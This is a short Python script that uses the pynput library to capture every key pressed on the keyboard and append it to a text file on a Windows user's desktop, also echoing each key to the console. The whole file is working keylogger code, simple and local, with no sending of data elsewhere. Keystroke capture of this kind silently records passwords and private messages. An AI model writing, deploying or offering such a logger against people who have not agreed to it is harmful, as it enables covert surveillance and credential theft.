
from pynput.keyboard import Key, Listener

path = r'C:\Users\danie\Desktop\logasfile.txt'

def on_press(key):
    file = open(path, 'a', encoding="utf8")
    file.write('{0}'.format(key))
    print('{0}'.format(key))
    if key == Key.enter:
        file.write('\n')
    file.close()


with Listener(on_press=on_press) as listener:
    listener.join()
